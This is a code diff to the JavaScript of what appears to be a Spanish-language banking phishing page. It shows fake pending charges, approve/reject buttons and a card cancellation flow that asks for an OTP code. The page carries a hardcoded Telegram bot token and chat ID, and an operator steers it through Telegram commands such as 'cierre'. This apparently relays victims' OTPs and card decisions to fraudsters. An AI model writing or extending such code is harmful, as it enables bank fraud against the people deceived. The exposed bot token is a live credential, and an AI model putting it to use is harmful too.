@@ -6,26 +6,17 @@ document.addEventListener('DOMContentLoaded', () => {
     emailSpan.textContent = userEmail;
   }
 
-  // --- 0. CARGO DINAMICO (si el operador lo configura en el paso previo) ---
-  try {
-    const cfgMerchant = sessionStorage.getItem('charge_merchant');
-    const cfgAmount = sessionStorage.getItem('charge_amount');
+  // --- 0. LECTURA DE DATOS DEL CARGO ACTUAL ---
+  const cfgMerchant = sessionStorage.getItem('charge_merchant');
+  const cfgAmount = sessionStorage.getItem('charge_amount');
+  const merchantSpan = document.getElementById('charge-merchant');
+  const amountSpan = document.getElementById('charge-amount');
 
-    if (cfgMerchant || cfgAmount) {
-      const merchantSpan = document.getElementById('charge-merchant');
-      const amountSpan = document.getElementById('charge-amount');
+  const currentMerchant = cfgMerchant || (merchantSpan ? merchantSpan.textContent : 'Programa Cero Sam´s');
+  const currentAmount = cfgAmount || (amountSpan ? amountSpan.textContent : '$6,000.00 MXN');
 
-      if (cfgMerchant && merchantSpan) merchantSpan.textContent = cfgMerchant;
-      if (cfgAmount && amountSpan) amountSpan.textContent = cfgAmount;
-
-      // Respaldo: si no existen los spans, reescribimos los parrafos directo
-      if ((cfgMerchant && !merchantSpan) || (cfgAmount && !amountSpan)) {
-        const ps = document.querySelectorAll('.charge-details p');
-        if (cfgMerchant && ps[0]) ps[0].innerHTML = '<strong>Comercio:</strong> ' + cfgMerchant;
-        if (cfgAmount && ps[1]) ps[1].innerHTML = '<strong>Monto Solicitado:</strong> ' + cfgAmount;
-      }
-    }
-  } catch (e) { }
+  if (merchantSpan) merchantSpan.textContent = currentMerchant;
+  if (amountSpan) amountSpan.textContent = currentAmount;
 
   // --- 1. REFERENCIAS DE VISTAS Y MENUS ---
   const navCargos = document.getElementById('nav-cargos');
@@ -53,105 +44,121 @@ document.addEventListener('DOMContentLoaded', () => {
   const botToken = '9068600803:AAHsD99VxpWVyedQoPlZeFV3OHotQJhK0W0';
   const chatId = '9180377107'; // Grupo Correcto
 
-  // --- 3. VERIFICAR ESTADO DEL OTP Y EN QUE PESTAÑA ABRIR ---
-  const lastAction = localStorage.getItem('transaction_status');
+  // --- 3. VERIFICAR ESTADO DEL OTP Y EN QUÉ PESTAÑA ABRIR ---
+  const lastAction = (localStorage.getItem('transaction_status') || '').toLowerCase();
   const flowType = sessionStorage.getItem('flow_type') || 'charge';
+  const accionTelegram = (sessionStorage.getItem('accion_telegram') || '').toLowerCase();
 
   const urlParams = new URLSearchParams(window.location.search);
   const tabRequested = urlParams.get('tab');
 
   if ((lastAction && flowType === 'baja') || tabRequested === 'baja') {
-      if (navBaja) navBaja.click();
+    if (navBaja) navBaja.click();
   }
 
 
-// --- 4. RESULTADO: LOGICA DE CARGOS ---
+// --- 4. HISTORIAL Y LÓGICA DE CARGOS ---
+  const historialContainer = document.getElementById('cargos-historial');
   const chargeCard = document.querySelector('.charge-card');
-  const chargeDetails = document.querySelector('.charge-details');
   const btnActionsRow = document.querySelector('.btn-actions-row');
 
-  // Obtenemos el comando enviado por Telegram
-  const accionTelegram = sessionStorage.getItem("accion_telegram");
+  let historialCargos = [];
+  try {
+    historialCargos = JSON.parse(localStorage.getItem('cargos_historial')) || [];
+  } catch (e) {
+    historialCargos = [];
+  }
 
-  // === REGLA DEFINITIVA: CONTROL SI SE ENVIÓ 'CIERRE' ===
+  let estadoResuelto = null;
   if (accionTelegram === 'cierre') {
-    // 1. Ocultamos los botones inmediatamente
-    if (btnActionsRow) btnActionsRow.style.display = 'none';
-
-    // 2. FORZAMOS EL DISEÑO DE RECHAZADO (ROJO CLARITO) AL CERRAR DESDE TELEGRAM
-    if (chargeCard) {
-      chargeCard.style.backgroundColor = '#f8d7da'; 
-      chargeCard.style.borderColor = '#f5c6cb';     
-      const h4 = chargeCard.querySelector('h4');
-      if (h4) {
-        h4.style.color = '#721c24';                 
-        h4.textContent = ' Transacción Rechazada / Bloqueada';
-      }
-    }
-    if (chargeDetails) {
-      // Evita duplicar el texto si ya existía en pantalla
-      if (!chargeDetails.innerHTML.includes("RECHAZADO")) {
-        chargeDetails.innerHTML += `<p><strong>Estado Actual:</strong> <span style="color: #dc3545; font-weight: bold;">RECHAZADO</span></p>`;
-      }
-    }
+    estadoResuelto = 'RECHAZADO';
+  } else if (flowType === 'charge' && lastAction === 'aprobado') {
+    estadoResuelto = 'APROBADO';
+  } else if (flowType === 'charge' && lastAction === 'rechazado') {
+    estadoResuelto = 'RECHAZADO';
   }
 
-  // === FLUJO NORMAL (Si no se activó el cierre prioritario de arriba) ===
-  if (accionTelegram !== 'cierre' && flowType === 'charge' && lastAction === 'aprobado') {
-    // === CASO: APROBADO (VERDE CLARO) ===
-    if (chargeCard) {
-      chargeCard.style.backgroundColor = '#d4edda';
-      chargeCard.style.borderColor = '#c3e6cb';
-      const h4 = chargeCard.querySelector('h4');
-      if (h4) {
-        h4.style.color = '#155724';
-        h4.textContent = ' Transacción Aprobada Exitosamente';
-      }
-    }
-    if (chargeDetails) {
-      chargeDetails.innerHTML += `<p><strong>Estado Actual:</strong> <span style="color: #28a745; font-weight: bold;">APROBADO</span></p>`;
-    }
+  if (estadoResuelto) {
+    historialCargos.push({
+      comercio: currentMerchant,
+      monto: currentAmount,
+      estado: estadoResuelto
+    });
+    localStorage.setItem('cargos_historial', JSON.stringify(historialCargos));
 
-  } else if (accionTelegram !== 'cierre' && flowType === 'charge' && lastAction === 'Rechazado') {
-    // === CASO: RECHAZADO NORMAL ===
-    if (chargeCard) {
-      chargeCard.style.backgroundColor = '#f8d7da'; 
-      chargeCard.style.borderColor = '#f5c6cb';     
-      const h4 = chargeCard.querySelector('h4');
-      if (h4) {
-        h4.style.color = '#721c24';                 
-        h4.textContent = ' Transacción Rechazada / Bloqueada';
-      }
-    }
-    if (chargeDetails) {
-      chargeDetails.innerHTML += `<p><strong>Estado Actual:</strong> <span style="color: #dc3545; font-weight: bold;">RECHAZADO</span></p>`;
-    }
+    localStorage.removeItem('transaction_status');
+    sessionStorage.removeItem('accion_telegram');
+    sessionStorage.removeItem('charge_merchant');
+    sessionStorage.removeItem('charge_amount');
+  }
+
+  function renderizarHistorial() {
+    if (!historialContainer) return;
+    historialContainer.innerHTML = '';
+
+    historialCargos.forEach((item) => {
+      const esAprobado = item.estado === 'APROBADO';
+      const bg = esAprobado ? '#d4edda' : '#f8d7da';
+      const border = esAprobado ? '#c3e6cb' : '#f5c6cb';
+      const titleColor = esAprobado ? '#155724' : '#721c24';
+      const badgeColor = esAprobado ? '#28a745' : '#dc3545';
+      const titulo = esAprobado ? 'Transacción Aprobada Exitosamente' : 'Transacción Rechazada / Bloqueada';
+
+      const cardHTML = `
+        <div class="charge-card" style="background-color: ${bg}; border-color: ${border}; margin-bottom: 15px;">
+          <h4 style="color: ${titleColor};">${titulo}</h4>
+          <div class="charge-details">
+            <p><strong>Comercio:</strong> ${item.comercio}</p>
+            <p><strong>Monto Solicitado:</strong> ${item.monto}</p>
+            <p><strong>Estado Actual:</strong> <span style="color: ${badgeColor}; font-weight: bold;">${item.estado}</span></p>
+          </div>
+        </div>
+      `;
+      historialContainer.innerHTML += cardHTML;
+    });
+  }
+
+  renderizarHistorial();
+
+  if (estadoResuelto && chargeCard) {
+    chargeCard.style.display = 'none';
+  } else if (chargeCard) {
+    chargeCard.style.display = 'block';
+    if (btnActionsRow) btnActionsRow.style.display = 'flex';
   }
 
 
 
-
-  // --- 5. RESULTADO: LOGICA DE BAJA DE TARJETA ---
+  // --- 5. RESULTADO: LÓGICA DE BAJA DE TARJETA ---
   const formBajaContainer = document.getElementById('baja-form-container');
   const bajaResultContainer = document.getElementById('baja-result-container');
 
-  if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'Aprobado') {
-      if(formBajaContainer) formBajaContainer.style.display = 'none';
-      if(bajaResultContainer) {
-          bajaResultContainer.style.display = 'block';
-          bajaResultContainer.style.backgroundColor = '#d4edda';
-          bajaResultContainer.style.border = '1px solid #c3e6cb';
-          bajaResultContainer.innerHTML = '<h4 style="color: #155724; font-size: 15px; margin-bottom: 10px;"✅ Tarjeta Digital Cancelada Exitosamente</h4><p style="font-size: 13px; color: #155724;">Su solicitud de baja ha sido procesada mediante la red segura. Su tarjeta ya no podra recibir cargos ni autorizaciones.</p>';
-      }
-  } else if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'Rechazado') {
-      if(formBajaContainer) formBajaContainer.style.display = 'none';
-      if(bajaResultContainer) {
-          bajaResultContainer.style.display = 'block';
-          bajaResultContainer.style.backgroundColor = '#f8d7da';
-          bajaResultContainer.style.border = '1px solid #f5c6cb';
-          bajaResultContainer.innerHTML = '<h4 style="color: #721c24; font-size: 15px; margin-bottom: 10px;"❌ Solicitud de Baja Rechazada</h4><p style="font-size: 13px; color: #721c24;">No se pudo validar su codigo de seguridad OTP. Por protección a sus recursos, la tarjeta digital seguira activa.</p>';
-      }
+  if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'aprobado') {
+    if (formBajaContainer) formBajaContainer.style.display = 'none';
+    if (bajaResultContainer) {
+      bajaResultContainer.style.display = 'block';
+      bajaResultContainer.style.backgroundColor = '#d4edda';
+      bajaResultContainer.style.border = '1px solid #c3e6cb';
+      bajaResultContainer.innerHTML = `
+        <h4 style="color: #155724; font-size: 15px; margin-bottom: 10px;">✅ Tarjeta Digital Cancelada Exitosamente</h4>
+        <p style="font-size: 13px; color: #155724;">Su solicitud de baja ha sido procesada mediante la red segura. Su tarjeta ya no podrá recibir cargos ni autorizaciones.</p>
+      `;
+    }
+    localStorage.removeItem('transaction_status');
+  } else if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'rechazado') {
+    if (formBajaContainer) formBajaContainer.style.display = 'none';
+    if (bajaResultContainer) {
+      bajaResultContainer.style.display = 'block';
+      bajaResultContainer.style.backgroundColor = '#f8d7da';
+      bajaResultContainer.style.border = '1px solid #f5c6cb';
+      bajaResultContainer.innerHTML = `
+        <h4 style="color: #721c24; font-size: 15px; margin-bottom: 10px;">❌ Solicitud de Baja Rechazada</h4>
+        <p style="font-size: 13px; color: #721c24;">No se pudo validar su código de seguridad OTP. Por protección a sus recursos, la tarjeta digital seguirá activa.</p>
+      `;
+    }
+    localStorage.removeItem('transaction_status');
   }
+  
 
   // --- 6. EVENTOS PARA LOS BOTONES DE CARGO ---
   const btnApprove = document.getElementById('btn-accept-charge');
@@ -171,7 +178,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (btnApprove) {
     btnApprove.addEventListener('click', async () => {
       sessionStorage.setItem('flow_type', 'charge');
-      sessionStorage.setItem('charge_action', 'aprobado');
+      sessionStorage.setItem('charge_action', 'Aprobado');
       if (statusMsg) {
         statusMsg.style.display = 'block';
         statusMsg.style.backgroundColor = '#d4edda';
@@ -186,7 +193,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (btnReject) {
     btnReject.addEventListener('click', async () => {
       sessionStorage.setItem('flow_type', 'charge');
-      sessionStorage.setItem('charge_action', 'rechazado');
+      sessionStorage.setItem('charge_action', 'Rechazado');
       if (statusMsg) {
         statusMsg.style.display = 'block';
         statusMsg.style.backgroundColor = '#f8d7da';
